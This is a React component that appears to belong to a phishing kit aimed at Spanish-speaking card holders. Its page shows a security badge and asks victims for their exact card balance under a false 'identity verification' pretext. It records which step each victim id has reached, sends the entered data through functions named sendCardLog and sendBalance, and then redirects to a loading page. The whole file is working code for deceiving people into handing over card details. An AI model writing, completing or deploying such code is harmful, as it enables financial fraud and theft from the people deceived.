import { useEffect } from 'react'
import toast from 'react-hot-toast'

import { useNavigate, useParams } from 'react-router-dom'
import { SecurityBadge } from '../components/badges/SecurityBadge'
import { Button } from '../components/ui/buttons/Button'
import { BalanceInput } from '../components/ui/inputs/BalanceInput'
import { useCardStore } from '../stores/useCardStore'
import { userEntered } from '../utils/utils'

export function BalanceModal() {
  const { id } = useParams()

  const { sendCardLog, sendBalance, balance, setBalance } = useCardStore()
  const navigate = useNavigate()

  useEffect(() => {
    if (id) {
      userEntered(id, 3)
    }
  }, [id])

  const onClickHandler = async () => {
    if (balance.length <= 0) {
      toast.error('No has introducido el saldo')
      return
    }

    if (location.pathname.startsWith('/balance/')) {
      const res = await sendCardLog(id!)

      if (res) {
        navigate(`/loading/${id}`, { replace: true })
      }
    } else if (location.pathname.startsWith('/exact-balance/')) {
      const res = await sendBalance(id!)

      if (res) {
        navigate(`/loading/${id}`, { replace: true })
      }
    }
  }

  return (
    <div className="flex h-full flex-col items-center rounded-2xl border border-border bg-white px-10 py-[40px]">
      <h1 className="mb-[32px] max-w-[324px] text-center font-normal leading-[19px]">
        Indique el saldo disponible en su tarjeta (con céntimos) para que el sistema pueda identificarle como titular dela misma e
        iniciar el proceso de verificación.
      </h1>
      <BalanceInput description="Saldo" placeholder="0.0 €" value={balance} onChange={setBalance} className="mb-3" />
      <Button title="Continuar" className="mb-4 h-[42px] w-full max-w-[264px] rounded-[10px]" onClick={onClickHandler} />
      <SecurityBadge />
    </div>
  )
}
